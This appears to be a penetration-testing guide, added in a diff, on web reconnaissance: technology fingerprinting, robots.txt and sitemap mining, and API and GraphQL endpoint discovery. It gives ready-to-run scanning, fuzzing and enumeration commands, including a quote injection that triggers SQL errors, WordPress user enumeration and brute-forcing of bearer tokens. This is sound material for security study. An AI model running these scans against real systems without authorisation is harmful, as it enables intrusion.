+**WAF Detection and Fingerprinting** - identifying Web Application Firewalls and security solutions protecting the target **SSL/TLS Configuration Analysis** - comprehensive certificate and cipher suite assessment beyond basic identification **Web Cache Poisoning Detection** - identifying cache behavior that could lead to exploitation **API Versioning and Endpoint Discovery** - systematic REST/GraphQL/SOAP API enumeration techniques
+
+---
+
+## Web Technology Stack Identification
+
+### Purpose and Methodology
+
+Technology stack identification reveals the underlying frameworks, libraries, server software, and languages used by a web application. This information guides subsequent exploitation attempts by identifying version-specific vulnerabilities and attack surfaces.
+
+### HTTP Header Analysis
+
+**Manual Header Inspection**
+
+```bash
+# Basic header retrieval
+curl -I http://target.com
+
+# Verbose output with all headers
+curl -v http://target.com
+
+# Follow redirects
+curl -IL http://target.com
+
+# Custom user agent
+curl -H "User-Agent: Mozilla/5.0" -I http://target.com
+```
+
+**Key Headers for Technology Identification**
+
+```bash
+# Server identification
+Server: Apache/2.4.41 (Ubuntu)
+Server: nginx/1.18.0
+Server: Microsoft-IIS/10.0
+
+# Framework indicators
+X-Powered-By: PHP/7.4.3
+X-Powered-By: Express
+X-AspNet-Version: 4.0.30319
+X-AspNetMvc-Version: 5.2
+
+# Additional technology hints
+X-Generator: Drupal 9
+X-Drupal-Cache: HIT
+X-Varnish: 123456
+X-Cache: HIT from cloudflare
+```
+
+### Whatweb - Automated Identification
+
+```bash
+# Basic scan
+whatweb http://target.com
+
+# Verbose output
+whatweb -v http://target.com
+
+# Aggressive mode (more requests)
+whatweb -a 3 http://target.com
+
+# Output to JSON
+whatweb --log-json=output.json http://target.com
+
+# Scan multiple URLs
+whatweb -i urls.txt
+
+# Custom user agent
+whatweb --user-agent "Mozilla/5.0" http://target.com
+```
+
+### Wappalyzer (Browser Extension & CLI)
+
+**CLI Usage**
+
+```bash
+# Install
+npm install -g wappalyzer
+
+# Basic scan
+wappalyzer http://target.com
+
+# JSON output
+wappalyzer http://target.com --pretty
+
+# Batch scanning
+cat urls.txt | xargs -I {} wappalyzer {}
+```
+
+**Browser Extension**
+
+```
+1. Install Wappalyzer browser extension
+2. Navigate to target website
+3. Click extension icon to view detected technologies
+4. Export results as JSON/CSV
+```
+
+### WhatRuns (Browser Extension)
+
+```
+1. Install WhatRuns extension
+2. Visit target website
+3. Click extension icon
+4. View categorized technology stack:
+   - Web frameworks
+   - JavaScript libraries
+   - Analytics tools
+   - CMS platforms
+   - CDN services
+```
+
+### BuiltWith
+
+```bash
+# API usage
+curl "https://api.builtwith.com/v20/api.json?KEY=YOUR_API_KEY&LOOKUP=target.com"
+
+# Web interface: https://builtwith.com/target.com
+```
+
+### Wapiti - Vulnerability Scanner with Tech Detection
+
+```bash
+# Basic scan with technology detection
+wapiti -u http://target.com
+
+# Verbose output
+wapiti -u http://target.com -v 2
+
+# Specific modules
+wapiti -u http://target.com -m nikto
+
+# Output formats
+wapiti -u http://target.com -f json -o output.json
+```
+
+### JavaScript Library Detection
+
+**Retire.js - Find Vulnerable JS Libraries**
+
+```bash
+# Install
+npm install -g retire
+
+# Scan website
+retire --jspath http://target.com
+
+# Scan specific JS file
+retire --jsrepo http://target.com/js/app.js
+
+# Output JSON
+retire --outputformat json http://target.com
+```
+
+**Manual JS Analysis**
+
+```bash
+# Download all JS files
+wget -r -l 1 -H -t 1 -nd -N -np -A.js -erobots=off http://target.com
+
+# Search for common libraries
+grep -r "jQuery" *.js
+grep -r "React.version" *.js
+grep -r "Angular.version" *.js
+
+# Extract version numbers
+grep -oP "version.*[0-9]+\.[0-9]+\.[0-9]+" *.js
+```
+
+**Browser Console Detection**
+
+```javascript
+// Check for common frameworks
+console.log(jQuery.fn.jquery);  // jQuery version
+console.log(React.version);     // React version
+console.log(angular.version);   // Angular version
+console.log(Vue.version);       // Vue version
+
+// Check for CMS indicators
+console.log(Drupal);           // Drupal
+console.log(wp);               // WordPress
+```
+
+### CMS Detection
+
+**CMSmap**
+
+```bash
+# WordPress scan
+cmsmap http://target.com
+
+# Joomla scan
+cmsmap -t J http://target.com
+
+# Drupal scan
+cmsmap -t D http://target.com
+
+# Aggressive scan
+cmsmap -a http://target.com
+
+# Output to file
+cmsmap -o output.txt http://target.com
+```
+
+**WPScan (WordPress-specific)**
+
+```bash
+# Basic WordPress scan
+wpscan --url http://target.com
+
+# Enumerate plugins
+wpscan --url http://target.com --enumerate p
+
+# Enumerate themes
+wpscan --url http://target.com --enumerate t
+
+# Enumerate users
+wpscan --url http://target.com --enumerate u
+
+# Vulnerable plugins detection
+wpscan --url http://target.com --enumerate vp
+
+# API token for vulnerability data
+wpscan --url http://target.com --api-token YOUR_TOKEN
+```
+
+**Droopescan (Drupal/SilverStripe)**
+
+```bash
+# Drupal scan
+droopescan scan drupal -u http://target.com
+
+# Enumerate plugins
+droopescan scan drupal -u http://target.com -e p
+
+# Enumerate themes
+droopescan scan drupal -u http://target.com -e t
+
+# SilverStripe scan
+droopescan scan silverstripe -u http://target.com
+```
+
+**JoomScan (Joomla-specific)**
+
+```bash
+# Basic Joomla scan
+joomscan -u http://target.com
+
+# Enumerate components
+joomscan -u http://target.com --enumerate-components
+
+# Check for vulnerabilities
+joomscan -u http://target.com -ec
+```
+
+### Framework-Specific Fingerprinting
+
+**ASP.NET Detection**
+
+```bash
+# Check for .aspx extensions
+curl http://target.com/default.aspx
+
+# ViewState parameter (ASP.NET indicator)
+curl http://target.com | grep -i "__VIEWSTATE"
+
+# Session cookie format
+curl -I http://target.com | grep "ASP.NET_SessionId"
+```
+
+**PHP Framework Detection**
+
+```bash
+# Laravel detection
+curl http://target.com | grep "laravel"
+curl -I http://target.com/public/
+
+# Symfony detection
+curl http://target.com | grep "symfony"
+curl http://target.com/app_dev.php
+
+# CodeIgniter detection
+curl http://target.com | grep "ci_session"
+
+# CakePHP detection
+curl http://target.com | grep "cakephp"
+```
+
+**Python Framework Detection**
+
+```bash
+# Django detection
+curl -I http://target.com | grep -i "django"
+curl http://target.com | grep "csrfmiddlewaretoken"
+
+# Flask detection
+curl -I http://target.com | grep "Werkzeug"
+curl http://target.com/static/
+
+# FastAPI detection
+curl http://target.com/docs  # Swagger UI
+curl http://target.com/redoc
+```
+
+**JavaScript Framework Detection**
+
+```bash
+# React detection
+curl http://target.com | grep "react"
+curl http://target.com | grep "data-reactroot"
+
+# Angular detection
+curl http://target.com | grep "ng-"
+curl http://target.com | grep "angular"
+
+# Vue.js detection
+curl http://target.com | grep "vue"
+curl http://target.com | grep "v-"
+```
+
+### Server-Side Technology Detection
+
+**Nmap Service Detection**
+
+```bash
+# HTTP service detection
+nmap -sV -p 80,443,8080,8443 target.com
+
+# HTTP title and headers
+nmap -p 80,443 --script http-title,http-headers target.com
+
+# Comprehensive web scan
+nmap -p 80,443 --script http-enum,http-headers,http-methods,http-title target.com
+```
+
+**Nikto - Web Server Scanner**
+
+```bash
+# Basic scan
+nikto -h http://target.com
+
+# SSL scan
+nikto -h https://target.com -ssl
+
+# Tuning for specific tests
+nikto -h http://target.com -Tuning 1,2,3
+
+# Save output
+nikto -h http://target.com -o output.txt -Format txt
+
+# Custom headers
+nikto -h http://target.com -useragent "Custom Agent"
+```
+
+### Database Technology Detection
+
+**[Inference]** Database types may be inferred from error messages, URL patterns, and specific behaviors:
+
+**Error-Based Detection**
+
+```bash
+# Trigger errors to reveal database type
+curl "http://target.com/page?id=1'"
+
+# MySQL errors
+"You have an error in your SQL syntax"
+"mysql_fetch_array()"
+
+# PostgreSQL errors
+"pg_query()"
+"PostgreSQL query failed"
+
+# MSSQL errors
+"Microsoft OLE DB Provider for SQL Server"
+"Unclosed quotation mark after the character string"
+
+# Oracle errors
+"ORA-01756"
+"oracle.jdbc.driver"
+```
+
+**SQLMap Database Detection**
+
+```bash
+# Identify database type
+sqlmap -u "http://target.com/page?id=1" --banner
+
+# Fingerprint DBMS
+sqlmap -u "http://target.com/page?id=1" --fingerprint
+```
+
+### CDN and WAF Detection
+
+**wafw00f - WAF Detection**
+
+```bash
+# Basic WAF detection
+wafw00f http://target.com
+
+# Verbose output
+wafw00f -v http://target.com
+
+# Test all WAF signatures
+wafw00f -a http://target.com
+
+# Output to JSON
+wafw00f -o output.json -f json http://target.com
+```
+
+**CDN Detection**
+
+```bash
+# Check DNS for CDN indicators
+dig target.com
+nslookup target.com
+
+# Common CDN patterns in DNS:
+# - *.cloudflare.com
+# - *.cloudfront.net
+# - *.akamai.net
+# - *.fastly.net
+
+# HTTP header indicators
+curl -I http://target.com | grep -i "cloudflare\|akamai\|fastly\|cloudfront"
+```
+
+### SSL/TLS Certificate Analysis
+
+**SSL Certificate Inspection**
+
+```bash
+# OpenSSL certificate details
+openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text
+
+# Extract issuer and subject
+echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -issuer -subject
+
+# Check certificate chain
+openssl s_client -showcerts -connect target.com:443
+```
+
+**SSLyze**
+
+```bash
+# Comprehensive SSL/TLS analysis
+sslyze target.com
+
+# Specific checks
+sslyze --certinfo target.com
+sslyze --heartbleed target.com
+```
+
+### Technology Stack Documentation
+
+**Automated Reporting**
+
+```bash
+# Combine multiple tools for comprehensive report
+{
+    echo "=== WhatWeb Results ==="
+    whatweb http://target.com
+    echo ""
+    echo "=== Nikto Results ==="
+    nikto -h http://target.com
+    echo ""
+    echo "=== WAF Detection ==="
+    wafw00f http://target.com
+} > technology_stack_report.txt
+```
+
+---
+
+## Robots.txt Analysis
+
+### Purpose and Structure
+
+Robots.txt is a file used to instruct web crawlers which parts of a website should not be processed or scanned. It often reveals sensitive directories, admin panels, and hidden resources.
+
+### Basic Robots.txt Retrieval
+
+```bash
+# Direct access
+curl http://target.com/robots.txt
+
+# With response headers
+curl -i http://target.com/robots.txt
+
+# Check for existence
+curl -I http://target.com/robots.txt
+
+# Alternative locations
+curl http://target.com/ROBOTS.TXT  # Case-insensitive on some servers
+```
+
+### Robots.txt Syntax and Directives
+
+**Common Directives**
+
+```
+User-agent: *           # Applies to all bots
+Disallow: /admin/       # Block access to directory
+Allow: /public/         # Explicitly allow access
+Crawl-delay: 10         # Delay between requests (seconds)
+Sitemap: http://target.com/sitemap.xml  # Sitemap location
+```
+
+**Example Robots.txt**
+
+```
+User-agent: *
+Disallow: /admin/
+Disallow: /private/
+Disallow: /backup/
+Disallow: /config/
+Disallow: /dev/
+Disallow: /*.sql$
+Disallow: /*.bak$
+Allow: /public/
+Sitemap: http://target.com/sitemap.xml
+```
+
+### Automated Robots.txt Parsing
+
+**Extract Disallowed Paths**
+
+```bash
+# Extract all disallowed paths
+curl -s http://target.com/robots.txt | grep "Disallow:" | cut -d: -f2 | sed 's/^ *//'
+
+# Extract and create full URLs
+curl -s http://target.com/robots.txt | grep "Disallow:" | awk '{print "http://target.com"$2}'
+
+# Filter out wildcards
+curl -s http://target.com/robots.txt | grep "Disallow:" | grep -v "*" | awk '{print $2}'
+```
+
+**Python Script for Robots.txt Analysis**
+
+```python
+import requests
+import re
+
+def parse_robots(url):
+    try:
+        response = requests.get(f"{url}/robots.txt")
+        if response.status_code == 200:
+            disallowed = re.findall(r'Disallow:\s*(.+)', response.text)
+            allowed = re.findall(r'Allow:\s*(.+)', response.text)
+            sitemaps = re.findall(r'Sitemap:\s*(.+)', response.text)
+            
+            print("[+] Disallowed paths:")
+            for path in disallowed:
+                print(f"  - {path.strip()}")
+            
+            print("\n[+] Explicitly allowed paths:")
+            for path in allowed:
+                print(f"  - {path.strip()}")
+            
+            print("\n[+] Sitemaps:")
+            for sitemap in sitemaps:
+                print(f"  - {sitemap.strip()}")
+                
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+parse_robots("http://target.com")
+```
+
+### Interesting Patterns in Robots.txt
+
+**High-Value Directories to Look For**
+
+```
+/admin/
+/administrator/
+/wp-admin/
+/phpmyadmin/
+/backup/
+/backups/
+/db/
+/database/
+/config/
+/conf/
+/api/
+/dev/
+/development/
+/test/
+/staging/
+/private/
+/internal/
+/.git/
+/.svn/
+/.env
+/logs/
+/log/
+```
+
+### Testing Disallowed Paths
+
+**Manual Path Testing**
+
+```bash
+# Test each disallowed path
+curl -I http://target.com/admin/
+curl -I http://target.com/backup/
+curl -I http://target.com/private/
+
+# Check for directory listing
+curl http://target.com/admin/
+
+# Test with authentication
+curl -u username:password http://target.com/admin/
+```
+
+**Automated Path Validation**
+
+```bash
+# Extract and test all disallowed paths
+curl -s http://target.com/robots.txt | grep "Disallow:" | awk '{print $2}' | while read path; do
+    status=$(curl -s -o /dev/null -w "%{http_code}" http://target.com$path)
+    echo "[$status] http://target.com$path"
+done
+```
+
+**Using ffuf for Path Discovery**
+
+```bash
+# Extract paths from robots.txt
+curl -s http://target.com/robots.txt | grep "Disallow:" | cut -d: -f2 | sed 's/^ *//' > disallowed.txt
+
+# Fuzz based on patterns
+ffuf -u http://target.com/FUZZ -w disallowed.txt -mc 200,301,302,403
+
+# Recursive fuzzing on discovered paths
+ffuf -u http://target.com/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt
+```
+
+### Robots.txt Bypass Techniques
+
+**User-Agent Spoofing**
+
+```bash
+# Some applications check User-Agent against robots.txt rules
+curl -A "Googlebot/2.1" http://target.com/admin/
+curl -A "Mozilla/5.0" http://target.com/admin/
+
+# Custom User-Agent
+curl -H "User-Agent: CustomBot/1.0" http://target.com/private/
+```
+
+**Direct Access Attempts**
+
+```bash
+# Robots.txt is advisory, not enforced
+# Try accessing disallowed paths directly
+curl http://target.com/admin/
+curl http://target.com/backup/
+
+# [Inference] Many applications only rely on robots.txt without implementing actual access controls
+```
+
+### Robots.txt in Different Contexts
+
+**Subdomain Robots.txt**
+
+```bash
+# Check robots.txt on all discovered subdomains
+for subdomain in $(cat subdomains.txt); do
+    echo "[+] Checking $subdomain"
+    curl -s http://$subdomain/robots.txt
+done
+```
+
+**Port-Specific Robots.txt**
+
+```bash
+# Check robots.txt on non-standard ports
+curl http://target.com:8080/robots.txt
+curl http://target.com:8443/robots.txt
+```
+
+### Historical Robots.txt Analysis
+
+**Wayback Machine**
+
+```bash
+# Check historical versions
+curl "http://web.archive.org/cdx/search/cdx?url=target.com/robots.txt&output=json"
+
+# Access historical snapshot
+curl "http://web.archive.org/web/20200101000000/http://target.com/robots.txt"
+```
+
+**Python Script for Historical Analysis**
+
+```python
+import requests
+
+def check_wayback_robots(domain):
+    url = f"http://web.archive.org/cdx/search/cdx?url={domain}/robots.txt&output=json"
+    response = requests.get(url)
+    
+    if response.status_code == 200:
+        snapshots = response.json()[1:]  # Skip header
+        print(f"[+] Found {len(snapshots)} historical snapshots")
+        
+        for snapshot in snapshots[:5]:  # Show first 5
+            timestamp = snapshot[1]
+            snapshot_url = f"http://web.archive.org/web/{timestamp}/{domain}/robots.txt"
+            print(f"  - {snapshot_url}")
+
+check_wayback_robots("target.com")
+```
+
+### Robots.txt Security Implications
+
+**Common Misconfigurations**
+
+```
+# Revealing sensitive files
+Disallow: /backup.sql
+Disallow: /database.bak
+Disallow: /.env
+Disallow: /config.php
+
+# Revealing administrative interfaces
+Disallow: /admin/
+Disallow: /cpanel/
+Disallow: /phpmyadmin/
+
+# Development/staging environments
+Disallow: /dev/
+Disallow: /test/
+Disallow: /staging/
+```
+
+---
+
+## Sitemap Discovery
+
+### Purpose and Types
+
+Sitemaps provide structured information about website content to search engines. They reveal URL structures, update frequencies, and content organization.
+
+### Sitemap Standard Locations
+
+```bash
+# Standard sitemap locations
+curl http://target.com/sitemap.xml
+curl http://target.com/sitemap_index.xml
+curl http://target.com/sitemap.xml.gz
+
+# WordPress-specific
+curl http://target.com/wp-sitemap.xml
+curl http://target.com/sitemap_index.xml
+
+# Alternative locations
+curl http://target.com/sitemap1.xml
+curl http://target.com/sitemap-index.xml
+curl http://target.com/sitemap.php
+```
+
+### Sitemap Discovery Methods
+
+**From Robots.txt**
+
+```bash
+# Extract sitemap URLs from robots.txt
+curl -s http://target.com/robots.txt | grep -i "sitemap:"
+
+# Download all referenced sitemaps
+curl -s http://target.com/robots.txt | grep -i "sitemap:" | awk '{print $2}' | while read sitemap; do
+    echo "[+] Downloading $sitemap"
+    curl -s "$sitemap" -o "$(basename $sitemap)"
+done
+```
+
+**Automated Sitemap Discovery**
+
+```bash
+# Using ffuf
+ffuf -u http://target.com/FUZZ -w sitemap_wordlist.txt -mc 200
+
+# Custom wordlist for sitemaps
+echo -e "sitemap.xml\nsitemap_index.xml\nsitemap1.xml\nsitemap.xml.gz\nwp-sitemap.xml" > sitemap_wordlist.txt
+
+# Using gobuster
+gobuster dir -u http://target.com -w sitemap_wordlist.txt -x xml,gz
+```
+
+### Sitemap XML Structure
+
+**Basic Sitemap Format**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  <url>
+    <loc>http://target.com/page1</loc>
+    <lastmod>2024-01-01</lastmod>
+    <changefreq>weekly</changefreq>
+    <priority>0.8</priority>
+  </url>
+  <url>
+    <loc>http://target.com/page2</loc>
+    <lastmod>2024-01-02</lastmod>
+    <changefreq>daily</changefreq>
+    <priority>1.0</priority>
+  </url>
+</urlset>
+```
+
+**Sitemap Index Format**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  <sitemap>
+    <loc>http://target.com/sitemap1.xml</loc>
+    <lastmod>2024-01-01</lastmod>
+  </sitemap>
+  <sitemap>
+    <loc>http://target.com/sitemap2.xml</loc>
+    <lastmod>2024-01-02</lastmod>
+  </sitemap>
+</sitemapindex>
+```
+
+### Parsing Sitemap URLs
+
+**Command-Line Parsing**
+
+```bash
+# Extract all URLs from sitemap
+curl -s http://target.com/sitemap.xml | grep -oP '<loc>\K[^<]+'
+
+# Count total URLs
+curl -s http://target.com/sitemap.xml | grep -c "<loc>"
+
+# Extract URLs with specific pattern
+curl -s http://target.com/sitemap.xml | grep -oP '<loc>\K[^<]+' | grep "/admin/"
+
+# Sort by lastmod date
+curl -s http://target.com/sitemap.xml | grep -E "<loc>|<lastmod>" | paste -d " " - -
+```
+
+**Python Sitemap Parser**
+
+```python
+import requests
+import xml.etree.ElementTree as ET
+
+def parse_sitemap(url):
+    response = requests.get(url)
+    root = ET.fromstring(response.content)
+    
+    # Define namespace
+    ns = {'ns': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
+    
+    urls = []
+    for url_elem in root.findall('ns:url', ns):
+        loc = url_elem.find('ns:loc', ns).text
+        lastmod = url_elem.find('ns:lastmod', ns)
+        lastmod = lastmod.text if lastmod is not None else "N/A"
+        priority = url_elem.find('ns:priority', ns)
+        priority = priority.text if priority is not None else "N/A"
+        
+        urls.append({
+            'url': loc,
+            'lastmod': lastmod,
+            'priority': priority
+        })
+    
+    return urls
+
+# Parse and display
+sitemap_urls = parse_sitemap("http://target.com/sitemap.xml")
+for item in sitemap_urls:
+    print(f"[{item['priority']}] {item['url']} (Modified: {item['lastmod']})")
+```
+
+### Sitemap Index Processing
+
+**Recursive Sitemap Crawler**
+
+```python
+import requests
+import xml.etree.ElementTree as ET
+
+def crawl_sitemap_index(index_url):
+    response = requests.get(index_url)
+    root = ET.fromstring(response.content)
+    
+    ns = {'ns': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
+    
+    all_urls = []
+    
+    # Check if this is a sitemap index
+    if root.tag == '{http://www.sitemaps.org/schemas/sitemap/0.9}sitemapindex':
+        print("[+] Processing sitemap index")
+        for sitemap in root.findall('ns:sitemap', ns):
+            loc = sitemap.find('ns:loc', ns).text
+            print(f"  [*] Crawling {loc}")
+            
+            # Recursively process each sitemap
+            sub_response = requests.get(loc)
+            sub_root = ET.fromstring(sub_response.content)
+            
+            for url_elem in sub_root.findall('ns:url', ns):
+                url = url_elem.find('ns:loc', ns).text
+                all_urls.append(url)
+    else:
+        # Regular sitemap
+        for url_elem in root.findall('ns:url', ns):
+            url = url_elem.find('ns:loc', ns).text
+            all_urls.append(url)
+    
+    return all_urls
+
+# Usage
+urls = crawl_sitemap_index("http://target.com/sitemap_index.xml")
+print(f"\n[+] Total URLs found: {len(urls)}")
+```
+
+### Analyzing Sitemap Content
+
+**Identify Interesting Paths**
+
+```bash
+# Download sitemap
+curl -s http://target.com/sitemap.xml -o sitemap.xml
+
+# Find admin/private paths
+grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "admin|private|internal|dev|test|staging"
+
+# Find API endpoints
+grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "api|v[0-9]|rest|graphql"
+
+# Find file uploads/documents
+grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "upload|document|pdf|doc|xls"
+
+# Find user-generated content
+grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "user|profile|member"
+```
+
+**URL Pattern Analysis**
+
+```bash
+# Extract URL patterns
+grep -oP '<loc>\K[^<]+' sitemap.xml | sed 's/[0-9]\+/ID/g' | sort -u
+
+# Identify parameter-based URLs
+grep -oP '<loc>\K[^<]+' sitemap.xml | grep "?"
+
+# Find potential ID enumeration targets
+grep -oP '<loc>\K[^<]+' sitemap.xml | grep -E "id=[0-9]+|user=[0-9]+"
+```
+
+### Sitemap-Based Fuzzing
+
+**Generate Fuzzing Wordlist from Sitemap**
+
+```bash
+# Extract all path components
+grep -oP '<loc>\K[^<]+' sitemap.xml | sed 's|http[s]*://[^/]*||' | tr '/' '\n' | grep -v "^$" | sort -u > wordlist.txt
+
+# Use for directory fuzzing
+ffuf -u http://target.com/FUZZ -w wordlist.txt
+
+# Extract query parameters for fuzzing
+grep -oP '<loc>\K[^<]+' sitemap.xml | grep -oP '\?.*' | tr '&' '\n' | cut -d= -f1 | sort -u > params.txt
+```
+
+### Compressed Sitemap Handling
+
+```bash
+# Download and decompress gzipped sitemap
+curl -s http://target.com/sitemap.xml.gz | gunzip > sitemap.xml
+
+# Process compressed sitemap directly
+curl -s http://target.com/sitemap.xml.gz | gunzip | grep -oP '<loc>\K[^<]+'
+```
+
+### Sitemap Differential Analysis
+
+**Compare Current vs Historical Sitemaps**
+
+```bash
+# Download current sitemap
+curl -s http://target.com/sitemap.xml | grep -oP '<loc>\K[^<]+' | sort > current_urls.txt
+
+# Download historical sitemap from Wayback Machine
+curl -s "http://web.archive.org/web/20230101000000/http://target.com/sitemap.xml" | grep -oP '<loc>\K[^<]+' | sort > old_urls.txt
+
+# Find newly added URLs
+comm -13 old_urls.txt current_urls.txt > new_urls.txt
+
+# Find removed URLs
+comm -23 old_urls.txt current_urls.txt > removed_urls.txt
+
+# Display results
+echo "[+] Newly added URLs:"
+cat new_urls.txt
+echo "[+] Removed URLs:"
+cat removed_urls.txt
+```
+
+---
+
+## API Endpoint Discovery
+
+### Purpose and Methodology
+
+API endpoint discovery identifies both documented and undocumented API routes that may expose sensitive functionality, data access, or administrative operations.
+
+### Common API Patterns and Conventions
+
+**RESTful API Patterns**
+
+```
+/api/v1/users
+/api/v1/users/{id}
+/api/v2/products
+/api/admin/settings
+/rest/users
+/services/data
+```
+
+**GraphQL Patterns**
+
+```
+/graphql
+/api/graphql
+/v1/graphql
+/query
+```
+
+**SOAP Patterns**
+
+```
+/soap
+/services
+/ws
+/webservice
+*.asmx
+*.wsdl
+```
+
+### JavaScript File Analysis for API Discovery
+
+**Extract API Endpoints from JavaScript**
+
+```bash
+# Download all JavaScript files
+wget -r -l 1 -H -t 1 -nd -N -np -A.js -erobots=off http://target.com
+
+# Search for API patterns
+grep -rhoP "https?://[^\"']*/api/[^\"\s']+" *.js | sort -u
+
+# Find relative API paths
+grep -rhoP "['\"]/(api|v[0-9]|rest|graphql)/[^'\"]*" *.js | sort -u
+
+# Extract endpoints with parameters
+grep -rhoP "['\"]/.+\?[^'\"]*" *.js | sort -u
+```
+
+**LinkFinder - JavaScript Endpoint Extraction**
+
+```bash
+# Install
+git clone https://github.com/GerbenJavado/LinkFinder.git
+cd LinkFinder
+python3 setup.py install
+
+# Scan single URL
+python3 linkfinder.py -i http://target.com/app.js -o cli
+
+# Scan domain (crawl for JS files)
+python3 linkfinder.py -i http://target.com -d -o cli
+
+# Output to HTML
+python3 linkfinder.py -i http://target.com -o results.html
+```
+
+**JSParser**
+
+```bash
+# Install
+git clone https://github.com/nahamsec/JSParser.git
+
+# Extract endpoints
+python3 handler.py http://target.com/app.js
+
+# Process multiple files
+find . -name "*.js" -exec python3 handler.py {} \;
+```
+
+### API Documentation Discovery
+
+**Common Documentation Endpoints**
+
+```bash
+# Swagger/OpenAPI
+curl http://target.com/swagger
+curl http://target.com/swagger.json
+curl http://target.com/swagger.yaml
+curl http://target.com/swagger-ui
+curl http://target.com/swagger-ui.html
+curl http://target.com/api-docs
+curl http://target.com/api/swagger.json
+curl http://target.com/v1/swagger.json
+curl http://target.com/v2/api-docs
+
+# ReDoc
+curl http://target.com/redoc
+curl http://target.com/docs
+
+# API Blueprint
+curl http://target.com/api.md
+curl http://target.com/blueprint
+
+# WADL (Web Application Description Language)
+curl http://target.com/application.wadl curl http://target.com/api/application.wadl
+
+# RAML (RESTful API Modeling Language)
+
+curl http://target.com/api.raml curl http://target.com/api/api.raml
+
+# GraphQL introspection
+
+curl http://target.com/graphql?query={__schema{types{name}}}
+
+# Postman collections
+
+curl http://target.com/postman.json curl http://target.com/collection.json
+````
+
+**Automated Documentation Discovery**
+```bash
+# Create wordlist for API documentation
+cat > api_docs.txt << EOF
+swagger
+swagger.json
+swagger.yaml
+swagger-ui
+swagger-ui.html
+api-docs
+api/swagger.json
+v1/swagger.json
+v2/api-docs
+redoc
+docs
+api/docs
+documentation
+api-documentation
+openapi.json
+openapi.yaml
+wadl
+application.wadl
+graphql
+api/graphql
+EOF
+
+# Fuzz for documentation
+ffuf -u http://target.com/FUZZ -w api_docs.txt -mc 200,301,302
+
+# Multi-level fuzzing
+ffuf -u http://target.com/api/FUZZ -w api_docs.txt -mc 200
+````
+
+### GraphQL Endpoint Discovery and Introspection
+
+**Finding GraphQL Endpoints**
+
+```bash
+# Common GraphQL locations
+curl -X POST http://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
+curl -X POST http://target.com/api/graphql -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
+curl -X POST http://target.com/v1/graphql -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
+curl -X POST http://target.com/query -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
+```
+
+**GraphQL Introspection Query**
+
+```bash
+# Full schema introspection
+curl -X POST http://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "query IntrospectionQuery {
+      __schema {
+        queryType { name }
+        mutationType { name }
+        subscriptionType { name }
+        types {
+          ...FullType
+        }
+      }
+    }
+    fragment FullType on __Type {
+      kind
+      name
+      description
+      fields(includeDeprecated: true) {
+        name
+        description
+        args {
+          ...InputValue
+        }
+        type {
+          ...TypeRef
+        }
+      }
+    }
+    fragment InputValue on __InputValue {
+      name
+      description
+      type { ...TypeRef }
+    }
+    fragment TypeRef on __Type {
+      kind
+      name
+      ofType {
+        kind
+        name
+      }
+    }"
+  }'
+
+# List all queries
+curl -X POST http://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'
+
+# List all mutations
+curl -X POST http://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { mutationType { fields { name description } } } }"}'
+```
+
+**GraphQL Voyager (Visual Schema Explorer)**
+
+```bash
+# Access if exposed
+curl http://target.com/voyager
+
+# Or use standalone with introspection JSON
+# 1. Save introspection query result to file
+# 2. Upload to https://graphql-voyager.netlify.app/
+```
+
+**InQL Scanner (Burp Extension)**
+
+```
+1. Install InQL from BApp Store in Burp Suite
+2. Navigate to GraphQL endpoint in browser (proxied through Burp)
+3. Right-click request > InQL > Generate queries
+4. Review generated queries in InQL tab
+```
+
+### REST API Fuzzing
+
+**Common REST API Wordlists**
+
+```bash
+# API-specific wordlists
+/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+/usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# Custom API wordlist
+cat > api_endpoints.txt << EOF
+users
+user
+accounts
+account
+profile
+profiles
+admin
+admins
+products
+product
+orders
+order
+payments
+payment
+transactions
+transaction
+settings
+config
+configuration
+status
+health
+info
+version
+auth
+login
+logout
+register
+signup
+token
+refresh
+api-keys
+keys
+webhooks
+notifications
+messages
+files
+upload
+download
+search
+query
+EOF
+```
+
+**ffuf API Fuzzing**
+
+```bash
+# Basic API endpoint discovery
+ffuf -u http://target.com/api/v1/FUZZ -w api_endpoints.txt -mc 200,201,301,302,401,403
+
+# Multiple API versions
+ffuf -u http://target.com/api/APIVER/ENDPOINT -w versions.txt:APIVER -w endpoints.txt:ENDPOINT
+
+# HTTP method fuzzing
+ffuf -u http://target.com/api/users/1 -w methods.txt -X FUZZ
+
+# Parameter fuzzing
+ffuf -u http://target.com/api/users?FUZZ=test -w parameters.txt -mc 200
+```
+
+**Gobuster API Mode**
+
+```bash
+# Directory/endpoint enumeration
+gobuster dir -u http://target.com/api/v1 -w api_endpoints.txt
+
+# With specific patterns
+gobuster dir -u http://target.com/api -w wordlist.txt -p api-patterns.txt
+```
+
+**wfuzz for API Discovery**
+
+```bash
+# Basic endpoint fuzzing
+wfuzz -w api_endpoints.txt http://target.com/api/FUZZ
+
+# Multi-parameter fuzzing
+wfuzz -w wordlist.txt -w ids.txt http://target.com/api/FUZZ/FUZ2Z
+
+# Header-based authentication fuzzing
+wfuzz -H "Authorization: Bearer FUZZ" -w tokens.txt http://target.com/api/admin
+```
+
+### API Version Discovery
+
